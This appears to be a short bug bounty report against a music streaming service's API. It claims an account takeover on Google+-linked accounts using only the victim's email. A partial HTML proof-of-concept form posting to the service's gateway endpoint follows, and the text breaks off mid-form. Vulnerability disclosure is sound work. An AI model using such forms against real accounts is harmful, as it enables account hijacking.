Hello,
This is **CRITICAL** .. I Can Login To Any Account Linked With Google+ With Email Only And Without  Password!!
##PoC:
```html
<form action="https://api.anghami.com/gateway.php" method="POST">
  <input type="hidden" name="m" value="gop">
  <input type="hidden" name="u" value="victim@email.com">  <!-- Victim's Email-->
